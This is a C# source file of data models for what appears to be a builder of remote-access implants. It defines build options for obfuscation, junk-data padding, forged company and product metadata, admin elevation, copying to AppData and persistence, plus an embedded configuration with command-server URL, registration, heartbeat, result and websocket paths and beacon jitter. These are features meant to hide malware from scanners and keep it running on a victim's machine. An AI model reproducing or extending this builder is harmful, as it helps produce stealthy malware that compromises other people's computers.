namespace LibraNextgen.Common.Models;

public class BuildConfigRequest
{
    public string Platform { get; set; } = "x64";
    public string ApplicationType { get; set; } = "Console";
    public string ServerHost { get; set; } = "127.0.0.1";
    public int ServerPort { get; set; } = 5270;
    public bool EnableObfuscation { get; set; }
    public bool InjectJunkData { get; set; }
    public int JunkDataMb { get; set; } = 10;
    public string? IconUrl { get; set; }
    public string? CompanyName { get; set; }
    public string? FileDescription { get; set; }
    public string? ProductName { get; set; }
    public string? Copyright { get; set; }
    public string? FileVersion { get; set; }
    public bool StripSymbols { get; set; } = true;
    public bool RequireAdmin { get; set; }
    public bool CopyToAppData { get; set; }
    public bool EnablePersistence { get; set; }
}

public class InjectedConfig
{
    [System.Text.Json.Serialization.JsonPropertyName("server_url")]
    public string server_url { get; set; } = "";

    [System.Text.Json.Serialization.JsonPropertyName("register_path")]
    public string register_path { get; set; } = "";

    [System.Text.Json.Serialization.JsonPropertyName("heartbeat_path")]
    public string heartbeat_path { get; set; } = "";

    [System.Text.Json.Serialization.JsonPropertyName("result_path")]
    public string result_path { get; set; } = "";

    [System.Text.Json.Serialization.JsonPropertyName("ws_path")]
    public string ws_path { get; set; } = "";

    [System.Text.Json.Serialization.JsonPropertyName("heartbeat_interval_ms")]
    public ulong heartbeat_interval_ms { get; set; } = 3000;

    [System.Text.Json.Serialization.JsonPropertyName("jitter_percent")]
    public double jitter_percent { get; set; } = 0.2;

    [System.Text.Json.Serialization.JsonPropertyName("require_admin")]
    public bool require_admin { get; set; }

    [System.Text.Json.Serialization.JsonPropertyName("copy_to_path")]
    public string? copy_to_path { get; set; }

    [System.Text.Json.Serialization.JsonPropertyName("enable_persistence")]
    public bool enable_persistence { get; set; }
}
